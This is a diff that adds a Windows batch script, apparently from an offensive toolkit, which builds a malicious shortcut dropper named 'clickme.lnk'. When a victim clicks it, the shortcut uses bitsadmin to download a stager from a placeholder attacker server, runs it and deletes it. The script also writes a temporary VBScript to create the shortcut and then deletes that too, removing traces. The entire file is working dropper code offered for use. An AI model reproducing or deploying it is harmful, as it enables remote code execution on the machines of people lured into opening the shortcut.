@@ -1,0 +1,32 @@
+@echo off
+
+setlocal enabledelayedexpansion
+
+rem Create a dropper in LNK (shortcut) format that will download and execute the CMD stager.
+
+set SERVER=http://<attacking_ip>/
+
+set PATH_PUBLIC_DIR=C:\Users\Public\Libraries\raw\
+rem Create the target directoty if it does not exist.
+if not exist "%PATH_PUBLIC_DIR%" mkdir %PATH_PUBLIC_DIR%
+
+set DROPPER_LNK=clickme.lnk
+set STAGER_CMD=stager.cmd
+set DROPPER_LNK_CREATE=dropper_lnk_create.vbs
+
+set URL_STAGER_CMD=%SERVER%%STAGER_CMD%
+
+set PATH_DROPPER_LNK_CREATE=%PATH_PUBLIC_DIR%%DROPPER_LNK_CREATE%
+set PATH_DROPPER_LNK=%PATH_PUBLIC_DIR%%DROPPER_LNK%
+set PATH_STAGER_CMD=%PATH_PUBLIC_DIR%%STAGER_CMD%
+
+rem Use a temporary VBScript to create the LNK dropper.
+rem The LNK dropper will contain code to download, execute and delete the CMD stager.
+echo Set oWS = WScript.CreateObject("WScript.Shell") > %PATH_DROPPER_LNK_CREATE%
+echo sLinkFile = "%PATH_DROPPER_LNK%" >> %PATH_DROPPER_LNK_CREATE%
+echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %PATH_DROPPER_LNK_CREATE%
+echo oLink.TargetPath = "C:\Windows\System32\cmd.exe" >> %PATH_DROPPER_LNK_CREATE%
+echo oLink.Arguments = "/c bitsadmin /transfer 1 /priority FOREGROUND %URL_STAGER_CMD% %PATH_STAGER_CMD% & call %PATH_STAGER_CMD% & del %PATH_STAGER_CMD%" >> %PATH_DROPPER_LNK_CREATE%
+echo oLink.Save >> %PATH_DROPPER_LNK_CREATE%
+cscript %PATH_DROPPER_LNK_CREATE%
+del %PATH_DROPPER_LNK_CREATE%
